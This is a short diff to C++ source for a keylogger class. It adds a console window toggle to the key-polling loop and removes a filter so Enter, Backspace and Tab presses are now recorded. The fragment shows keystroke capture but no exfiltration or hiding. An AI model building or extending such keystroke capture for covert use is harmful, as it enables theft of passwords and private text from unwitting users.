@@ -2,6 +2,7 @@
 
 Keylogger::Keylogger() 
 	: keylog(nullptr) 
+	, console()
 {
 	setlocale(LC_ALL, "");
 }
@@ -11,6 +12,8 @@ void Keylogger::startKeylog() {
 		while (isKeylogging()) {
 			setKeysState();
 			handleOutput();
+			console.toggleWindow(getKeys());
+
 			std::this_thread::sleep_for(polling);
 		}
 	};
@@ -47,10 +50,7 @@ void Keylogger::handleOutput() {
 		const auto& keyLayout = keysLayout[i];
 		const auto& key = keys[keyLayout.VirtualKey];
 
-		if (!key.isAlternating() || !key.isPressed() ||
-			key.value == VK_RETURN || key.value == VK_BACK ||
-			key.value == VK_TAB)
-		{
+		if (!key.isAlternating() || !key.isPressed()) {
 			continue;
 		}
 
